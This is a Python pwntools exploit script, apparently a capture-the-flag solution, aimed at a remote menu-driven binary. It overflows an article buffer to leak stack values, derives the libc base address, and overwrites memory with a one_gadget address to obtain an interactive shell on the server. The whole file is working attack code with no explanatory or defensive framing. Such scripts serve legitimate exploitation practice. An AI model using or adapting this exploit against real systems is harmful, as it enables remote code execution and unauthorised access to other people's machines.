from pwn import *

#p = process('./prob', env={"LD_PRELOAD":"./libc.so.6"})
#p = process('./prob')
p = remote('15.165.201.217', 12345)

libc = ELF('./libc.so.6')
#libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')

# 유틸리티
def menu(choice):
    p.recvuntil(b'>')
    p.sendline(str(choice).encode())

def write_article(content):
    menu(1)
    p.recvuntil(b': ')
    p.sendline(str(len(content)).encode())
    p.recvuntil(b': ')
    p.sendline(content)

def edit_page(pagenum, payload):
    menu(3)
    p.recvuntil(b': ')
    p.sendline(str(pagenum).encode())
    p.recvuntil(b'Edit size: ')
    p.sendline(str(len(payload)).encode())
    
    p.recvuntil(b'Write content : ')
    if len(payload) > 8:
        p.send(payload)
    else:
        p.sendline(payload)

def view_article(n):
    menu(2)
    p.recvuntil(b'Content: ')
    content = p.recvuntil(b'\n\n', drop=True)
    add = content[256+n:264+n]
    return u64(add.ljust(8, b'\x00'))

payload_s = b'A'*256
write_article(payload_s)

stack_leaks = []  # 배열 초기화

leak = view_article(0)
log.info(f'0th Stack leak: {hex(leak)}')
stack_leaks.append(leak)

i=1
while(i<9):
    payload_overflow = b'B'*0x8*i
    edit_page(4, payload_overflow)

    leak = view_article(len(payload_overflow))
    log.info(f'{i}th Stack leak: {hex(leak)}')

    stack_leaks.append(leak)

    i+=1

pause()

#i=3
libc_base = stack_leaks[3]- 0x2a150- 122

log.info(f'libc base: {hex(libc_base)}')

main_leak = stack_leaks[5]
stack_leak = stack_leaks[7]

payload = b'A'*8 + p64(stack_leaks[1]-10)
payload += b'B'*8

payload += p64(libc_base+0x583ec)
#ONE_gadget

edit_page(4, payload)

menu(4)

p.interactive()

